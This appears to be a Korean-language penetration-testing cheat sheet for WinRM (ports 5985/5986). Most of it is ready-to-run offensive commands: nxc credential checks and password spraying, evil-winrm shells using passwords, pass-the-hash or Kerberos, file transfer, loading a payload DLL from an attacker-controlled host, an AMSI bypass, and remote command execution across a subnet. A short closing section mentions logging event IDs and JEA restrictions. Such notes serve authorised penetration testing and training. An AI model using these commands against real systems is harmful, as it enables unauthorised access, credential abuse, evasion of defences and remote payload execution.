# WinRM (5985/5986)

Windows Remote Management. PowerShell Remoting에 사용. 5985(HTTP), 5986(HTTPS).

---

## 접근 요건

- **Remote Management Users** 그룹 멤버이거나 **로컬 관리자**
- WinRM 서비스가 활성화되어 있어야 함

---

## 인증 확인

```bash
# nxc로 WinRM 인증 확인
nxc winrm TARGET -u user -p pass
nxc winrm TARGET -u user -H NTHASH

# "Pwn3d!" 표시 = 쉘 획득 가능
```

---

## 쉘 획득

### evil-winrm

```bash
# 비밀번호
evil-winrm -i TARGET -u user -p 'password'

# NTLM Hash (Pass-the-Hash)
evil-winrm -i TARGET -u user -H NTHASH

# SSL (5986)
evil-winrm -i TARGET -u user -p 'password' -S

# Kerberos
evil-winrm -i TARGET -r DOMAIN.LOCAL
```

### evil-winrm 내장 기능

```bash
# 파일 전송
upload /local/file C:\remote\path
download C:\remote\file /local/path

# PowerShell 스크립트 directory 로드
evil-winrm -i TARGET -u user -p pass -s /opt/scripts/
menu  # 사용 가능한 함수 확인

# DLL 로드
evil-winrm -i TARGET -u user -p pass -e /opt/dlls/
Dll-Loader -http http://ATTACKER/payload.dll

# 바이너리 로드 (AppLocker 우회)
Bypass-4MSI  # AMSI 우회 시도
```

### nxc로 명령 실행

```bash
# 단일 명령 실행
nxc winrm TARGET -u user -p pass -x "whoami /all"

# PowerShell 명령
nxc winrm TARGET -u user -p pass -X "Get-Process"

# 여러 호스트
nxc winrm 10.10.10.0/24 -u user -p pass -x "hostname"
```

### PowerShell Remoting (Windows에서)

```powershell
# PSSession 생성
$cred = Get-Credential
Enter-PSSession -ComputerName TARGET -Credential $cred

# 원격 명령 실행
Invoke-Command -ComputerName TARGET -Credential $cred -ScriptBlock { whoami }

# 여러 호스트에 동시 실행
Invoke-Command -ComputerName SRV01,SRV02 -Credential $cred -ScriptBlock { hostname }
```

---

## Brute Force

```bash
nxc winrm TARGET -u users.txt -p 'Password1!' --continue-on-success
```

---

## 유의사항

!!! warning "로깅"
    WinRM/PowerShell Remoting session은 **PowerShell ScriptBlock Logging**, **Module Logging**, **Transcription**이 활성화되면 모든 명령이 기록된다. `4104` (ScriptBlock), `4103` (Module) 이벤트 로그 확인.

!!! tip "JEA (Just Enough Administration)"
    JEA가 설정된 endpoint는 사용 가능한 명령이 제한된다. `Get-Command`으로 허용된 명령 확인.
